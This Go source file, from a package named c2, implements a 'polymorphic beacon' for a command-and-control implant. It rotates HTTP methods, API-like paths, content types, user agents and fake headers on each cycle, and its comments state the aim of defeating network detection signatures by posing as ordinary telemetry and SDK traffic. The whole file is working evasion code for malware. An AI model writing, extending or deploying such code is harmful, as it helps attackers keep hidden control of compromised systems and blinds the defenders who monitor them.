package c2

import (
	"crypto/rand"
	"fmt"
	"sync"
)

// Polymorphic Beacon
//
// OPSEC rationale: NDR tools build signatures on HTTP request patterns —
// same path, same headers, same content-type every beacon cycle. If we
// rotate ALL observable HTTP characteristics each cycle, signature-based
// detection fails. Combined with JA3 randomization, every beacon looks
// like a completely different application.

// BeaconProfile defines the HTTP characteristics for a single beacon cycle.
type BeaconProfile struct {
	Method      string
	Path        string
	ContentType string
	Accept      string
	UserAgent   string
	Headers     map[string]string
}

// PolymorphicBeacon rotates HTTP profiles each beacon cycle.
type PolymorphicBeacon struct {
	mu sync.Mutex
}

// HTTP paths that look like legitimate API endpoints
var beaconPaths = []string{
	"/api/v1/health",
	"/api/v2/status",
	"/api/v1/metrics",
	"/api/v1/config",
	"/api/v2/events",
	"/api/v1/telemetry",
	"/v1/check",
	"/v2/heartbeat",
	"/api/reports",
	"/api/v1/logs",
	"/oauth/token",
	"/api/v1/updates",
	"/graphql",
	"/api/v2/sync",
	"/api/v1/notifications",
	"/.well-known/openid-configuration",
	"/api/v1/analytics",
	"/cdn-cgi/trace",
}

// Content types to rotate through
var beaconContentTypes = []string{
	"application/json",
	"application/x-www-form-urlencoded",
	"application/octet-stream",
	"text/plain; charset=utf-8",
	"application/xml",
	"application/grpc",
	"multipart/form-data",
	"application/protobuf",
}

// Accept headers matching the content types
var beaconAcceptHeaders = []string{
	"application/json, text/plain, */*",
	"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
	"application/json",
	"*/*",
	"application/xml, text/xml",
	"application/grpc",
	"application/json;q=0.9,*/*;q=0.8",
	"text/event-stream",
}

// User agents — different from the JA3 browser UAs, these mimic
// application/SDK clients that commonly make API calls
var beaconUserAgents = []string{
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
	"python-requests/2.31.0",
	"Go-http-client/2.0",
	"curl/8.5.0",
	"axios/1.6.5",
	"okhttp/4.12.0",
	"node-fetch/3.3.2",
	"Prometheus/2.48.0",
	"Grafana/10.2.3",
	"datadog-agent/7.50.0",
	"elasticapm-python/6.20.0",
	"aws-sdk-go/1.50.0 (go1.21; linux; amd64)",
	"Google-Cloud-SDK gcloud/460.0.0",
}

// NewPolymorphicBeacon creates a beacon that rotates profiles.
func NewPolymorphicBeacon() *PolymorphicBeacon {
	return &PolymorphicBeacon{}
}

// NextProfile returns the HTTP profile for the next beacon cycle.
// Each call returns a different combination of path, content-type, headers.
func (pb *PolymorphicBeacon) NextProfile() BeaconProfile {
	pb.mu.Lock()
	defer pb.mu.Unlock()

	profile := BeaconProfile{
		Method:      selectMethod(),
		Path:        beaconPaths[CryptoRandIntn(len(beaconPaths))],
		ContentType: beaconContentTypes[CryptoRandIntn(len(beaconContentTypes))],
		Accept:      beaconAcceptHeaders[CryptoRandIntn(len(beaconAcceptHeaders))],
		UserAgent:   beaconUserAgents[CryptoRandIntn(len(beaconUserAgents))],
		Headers:     generateRandomHeaders(),
	}

	return profile
}

func selectMethod() string {
	methods := []string{"POST", "PUT", "PATCH"}
	return methods[CryptoRandIntn(len(methods))]
}

func generateRandomHeaders() map[string]string {
	headers := make(map[string]string)

	// Always include some standard headers to look normal
	headers["Cache-Control"] = "no-cache"

	// Randomly include optional headers.
	// NOTE: X-Request-ID is NOT randomized here — it is set deterministically
	// by HTTPSTransport.doPost() to the implant ID for session lookup.
	if CryptoRandIntn(2) == 0 {
		headers["X-Correlation-ID"] = generateRequestID()
	}
	if CryptoRandIntn(3) == 0 {
		headers["X-Forwarded-For"] = generateInternalIP()
	}
	if CryptoRandIntn(2) == 0 {
		headers["Authorization"] = fmt.Sprintf("Bearer %s", generateFakeToken())
	}
	if CryptoRandIntn(3) == 0 {
		headers["X-API-Key"] = generateFakeToken()
	}

	return headers
}

func generateRequestID() string {
	b := make([]byte, 16)
	rand.Read(b)
	return fmt.Sprintf("%08x-%04x-%04x-%04x-%012x",
		b[0:4], b[4:6], b[6:8], b[8:10], b[10:16])
}

func generateInternalIP() string {
	// Avoid 0 (network) and 255 (broadcast) in all octets.
	return fmt.Sprintf("10.%d.%d.%d",
		CryptoRandIntn(254)+1,
		CryptoRandIntn(254)+1,
		CryptoRandIntn(254)+1)
}

func generateFakeToken() string {
	b := make([]byte, 32)
	rand.Read(b)
	return fmt.Sprintf("%x", b)
}

// CryptoRandIntn is defined in ja3.go (same package).
